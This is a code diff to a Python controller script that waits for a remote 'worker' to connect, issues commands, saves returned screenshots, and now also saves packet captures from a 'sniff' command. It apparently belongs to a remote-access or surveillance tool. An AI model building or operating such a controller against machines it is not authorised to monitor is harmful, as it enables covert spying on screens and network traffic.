@@ -1,4 +1,5 @@
 import socket
+import shlex
 from server_http import Server
 from api import API
 from request import Request
@@ -11,6 +12,7 @@ print("[*] Waiting for worker...")
 conn, addr = master.connection.accept()
 master.connection.close()
 print(f"[+] Worker connected from {addr}")
+
 def recv_all(sock):
     raw = b""
     while True:
@@ -42,6 +44,13 @@ while True:
         with open(path, "wb") as f:
             f.write(response.body)
         print(f"screenshot saved to {path}")
+
+    elif cmd.startswith("sniff") and shlex.split(cmd)[5] == "master":
+        path = shlex.split(cmd)[4]
+        with open(path, "wb") as f:
+            f.write(response.body)
+        print(f"pcap saved to {path}")
+
     else:
         print(response.body.decode(errors="replace"))
 
